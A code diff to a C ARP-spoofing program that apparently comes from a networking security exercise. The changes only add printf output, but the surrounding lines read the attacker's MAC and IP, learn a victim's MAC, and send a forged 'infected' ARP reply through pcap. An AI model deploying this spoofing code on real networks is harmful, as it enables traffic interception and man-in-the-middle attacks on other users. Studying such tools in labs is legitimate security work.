@@ -70,6 +70,8 @@ int main(int argc, char *argv[])
 	sender_ip = argv[2];
 	target_ip = argv[3];
 
+	printf("============= Send ARP =============\n");
+
 	fd = socket(AF_INET, SOCK_DGRAM, 0);
 	if(fd < 0) perror("socket fail");
 
@@ -78,11 +80,15 @@ int main(int argc, char *argv[])
 	if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) perror("ioctl fail");
 
 	memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);
- 
+
+	printf("******* get attacker's info *******\n");
+	printf("attacker MAC %x:%x:%x:%x:%x:%x \n", attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]); 	 
+	
 	/* Get ip address */
 	ioctl(fd, SIOCGIFADDR, &ifr);
 	close(fd);
 	attacker_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+	printf("attacker IP  %s\n",attacker_ip);
 
 	/* Open network device for packet capture */ 
 	if((handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf))==NULL) {
@@ -138,7 +144,9 @@ int main(int argc, char *argv[])
 		break;
 	}
 
-	//printf("%x %x %x %x %x %x \n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]); 
+	printf("******** get sender's info ********\n"); 
+	printf("sender MAC   %x:%x:%x:%x:%x:%x \n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]); 
+	printf("sender IP    %s\n", sender_ip);
 
 	/* Make Ethernet packet */
 	ethhdr = (struct ether_header *)infect;
@@ -159,10 +167,18 @@ int main(int argc, char *argv[])
 	arpheader->tpa = inet_addr(sender_ip);
 
 	/* Send ARP request */
+	printf("****** send infected packet *******\n");
+	printf("src MAC      %x:%x:%x:%x:%x:%x \n", arpheader->sha[0], arpheader->sha[1], arpheader->sha[2], arpheader->sha[3], arpheader->sha[4], arpheader->sha[5]);
+	printf("src IP       %s\n", target_ip);
+	printf("dst MAC      %x:%x:%x:%x:%x:%x \n", arpheader->tha[0], arpheader->tha[1], arpheader->tha[2], arpheader->tha[3], arpheader->tha[4], arpheader->tha[5]);
+	printf("dst IP       %s\n", sender_ip);
+	
 	pcap_sendpacket(handle, infect, PACKET_SIZE);			
 
 	/* Close handle */
 	pcap_close(handle);
+
+	printf("====================================\n");
 	
 	return 0;
 }
